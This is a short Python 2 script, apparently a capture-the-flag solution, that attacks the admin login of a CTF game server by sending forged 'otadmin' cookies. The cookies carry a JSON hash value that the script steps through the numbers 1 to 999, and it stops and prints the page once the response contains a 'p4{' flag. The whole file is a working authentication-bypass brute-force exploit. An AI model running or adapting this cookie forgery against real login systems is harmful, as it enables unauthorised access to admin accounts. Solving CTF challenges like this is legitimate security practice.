import time
import random
import os
import urllib2

target_url = "https://gameserver.zajebistyc.tf/admin/login.php"
cookie_name = "otadmin"
cookie_value = "{{\"hash\": {}}}"

# Check cookie method.
def check_cookie(value_to_check):
   
   # Trying cookie.
   cookie = "{}={}".format(cookie_name, cookie_value.format(value_to_check))
   print "[*] Trying cookie {}".format(cookie)      
   req = urllib2.Request(target_url)
   req.add_header("Cookie", cookie)
   req.add_header("User-Agent", "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);")
   page = urllib2.urlopen(req)
   content = page.read()
      
   # Flag found.
   if "p4{" in content:
      print content
      return True
   else:
      return False

# Main method.
for i in range(1, 1000):

   try:
      
      if check_cookie(i):
         break
   
   except urllib2.HTTPError as err:
      print "[*] Response > {}".format(err.code)
      break
